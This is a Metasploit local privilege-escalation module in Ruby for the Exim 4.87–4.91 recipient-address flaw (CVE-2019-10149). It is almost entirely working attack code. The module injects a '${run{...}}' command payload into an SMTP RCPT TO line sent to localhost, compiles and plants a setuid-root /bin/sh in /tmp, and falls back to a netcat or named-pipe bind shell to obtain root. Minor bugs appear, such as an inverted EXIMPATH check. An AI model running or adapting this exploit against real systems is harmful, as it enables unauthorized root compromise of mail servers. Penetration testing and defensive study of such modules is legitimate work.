##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Exim 4.87 - 4.91 Privilege Escalation',
      'Description'    => %q{
        This module implements a flaw found in Exim versions 4.87 to 4.91 (inclusive).
        Improper validation of recipient address in deliver_message()
        function in /src/deliver.c may lead to remote command execution
        (CVE-2019-10149).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Marco Ivaldi (@0xdea)', # Working exploit
          'Guillaume AndrÃ© (@yaumn_)' # Metasploit module
        ],
      'DisclosureDate' => '2019-06-05',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        =>
        [
          [
            'Exim 4.87 - 4.91',
            lower_version: Gem::Version.new('4.87'),
            upper_version: Gem::Version.new('4.91')
          ]
        ],
      'References'     =>
        [
          [ 'CVE', '2019-10149' ],
          [ 'EDB', '46996' ]
        ]
      ))

    register_options(
      [
        OptString.new('EXIMPATH', [false, 'The path to the exim executable (used to check for vulnerability)']),
        OptInt.new('EXIMPORT', [true, 'The port exim is listening to', 25])
      ])

    register_advanced_options(
      [
        OptString.new('NetcatPort', [true, 'The port netcat must listen to (used for netcat method)', '13371']),
        OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
      ])
  end

  def check
    exim = if datastore['EXIMPATH']
             'exim'
           else
             datastore['EXIMPATH']
           end
    if cmd_exec("which #{exim}").blank?
      print_error('Exim executable not found. You may want to set EXIMPATH.')
      return CheckCode::Unknown
    end

    res = cmd_exec("#{exim} -bV")
    if res =~ /Exim version ([0-9\.]*) /i # Maybe improve the regex
      version = Gem::Version.new($1)
      if version >= target[:lower_version] && version <= target[:upper_version]
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end
    CheckCode::Unknown
  end

  def encode_path(path)
    path.gsub('/', '\x2f')
  end

  def inject_payload(payload)
    #puts payload
    res = cmd_exec("exec 3<>/dev/tcp/127.0.0.1/#{datastore['EXIMPORT']}")

    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "helo localhost" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "mail from:<>" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec("echo 'rcpt to:<#{payload}>' >&3")
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "data" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    for i in (1..31)
      cmd_exec("echo 'Received: #{i}' >&3")
    end
    cmd_exec('echo "." >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "quit" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('exec 3<&-')

    print_status('Payload sent, wait a few seconds...')
    sleep(5)
  end

  def exploit
    print_status('Trying setuid method to escalate privileges')
    shell_c_code = %|
          #include <unistd.h>
          #include <sys/types.h>

          int main() {
            setuid(0);
            setgid(0);
            execve("/bin/sh", NULL, NULL);
            return 0;
          }
    |

    suid_shell_path = File.join(datastore['WritableDir'], Rex::Text.rand_text_alpha(10))
    write_file("#{suid_shell_path}.c", shell_c_code)
    cmd_exec("gcc -o #{suid_shell_path} #{suid_shell_path}.c 2>&1")

    inject_payload('${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t' +
                   encode_path(suid_shell_path) + '\x3bchmod\t4755\t' +
                   encode_path(suid_shell_path) + '\x22}}@localhost')

    cmd_exec("#{suid_shell_path}")
    rm_f("#{suid_shell_path}", "#{suid_shell_path}.c")

    if is_root?
      print_good('You are now root, enjoy!')
      return
    end

    print_warning('Couldn\'t escalate privileges, trying netcat method')

    if cmd_exec('which nc').blank?
      print_error('Could\' find netcat')
      return
    end

    # If nc does not have the -e option, try with nc.traditional
    netcat = ''
    if !(cmd_exec('nc -e 2>&1') =~ /invalid option/)
      netcat = 'nc'
    elsif cmd_exec('which nc.traditional').present?
      netcat = 'nc.traditional'
    end

    # If nc does not have -e option and nc.traditional is not present, try
    # pipe method
    if netcat.empty?
      pipe_path = File.join(datastore['WritableDir'], Rex::Text.rand_text_alpha(10))
      cmd("mknod #{pipe_path} p")
      print_warning("You will need to manually remove #{pipe_path}.")

      inject_payload('${run{\x2fbin\x2fsh\t-c\t\x22\x2fbin\x2fsh\t0\x3c' +
                     encode_path(pipe_path) + '\t\x7c\tnc\t-lp\t127.0.0.1\t' +
                     datastore['NetcatPort'] + '\t1\x3e' +
                     encode_path(pipe_path) + '\x22}}@localhost')
    else
      inject_payload('${run{\x2fbin\x2fsh\t-c\t\x22' + netcat +
                     '\t-lp\t' + datastore['NetcatPort'] +
                     '\t-e\t\x2fbin\x2fsh\x22}}@localhost')
    end

    cmd_exec("nc 127.0.0.1 #{datastore['NetcatPort']}")
    file_rm(pipe_path)

    if is_root?
      print_good('You are now root, enjoy!')
    else
      print_error('Couldn\'t escalate privileges...')
    end
  end
end
